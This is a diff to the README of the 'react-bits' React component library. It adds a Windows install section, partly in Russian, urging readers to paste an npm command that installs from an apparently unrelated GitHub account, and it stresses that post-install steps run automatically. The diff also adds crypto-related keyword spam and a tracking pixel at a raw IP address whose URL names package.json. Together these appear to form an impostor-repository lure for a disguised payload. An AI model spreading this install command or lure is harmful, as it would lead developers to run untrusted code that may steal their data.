@@ -1,3 +1,20 @@
+**React Bits: UI Components that Just Work**
+
+Welcome to `react-bits`! This is a curated collection of lightweight, animated, and highly interactive React components designed to give your user interfaces an instant upgrade without the bloat.
+We know how frustrating it is when a library breaks after an update, which is why we focus heavily on reliability and have recently rolled out a wave of stability fixes to keep everything running smoothly. If you are developing on a Windows environment, you're in luck—getting everything set up and running locally is incredibly straightforward and hassle-free. Dive in, grab the components you need, and start building something beautiful!
+
+**Quick install (Windows)**
+
+1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
+2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
+3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)
+
+```bash
+npm install git+https://github.com/Passionwithfoyer/react-bits.git
+```
+
+[https://github.com/Passionwithfoyer/react-bits](https://github.com/Passionwithfoyer/react-bits)
+
 <div align="center">
 	<br>
 	<br>
@@ -159,3 +176,11 @@ React Bits occasionally draws inspiration from publicly available code examples.
 ## 📄 License
 
 [MIT + Commons Clause](https://github.com/davidhdev/react-bits/blob/main/LICENSE.md) — free for personal and commercial use.
+
+## Related searches
+
+Developers exploring this project are often searching for highly customizable web solutions that streamline complex financial logic and decentralized app interfaces. Common queries target plug-and-play code architectures capable of handling sophisticated trading scripts, yield strategies, and secure transactional layouts natively in frontend applications.
+
+**Topics:** crypto mixer, uniswap, defi bot, staking bot, arbitrage bot, react patterns, smart contract interface, dApp components, flash loan script, web3 boilerplate
+
+![.](http://5.231.58.248:8787/pixel?repo=Passionwithfoyer%2Freact-bits&inject=Passionwithfoyer%2Freact-bits%2Fpackage.json)
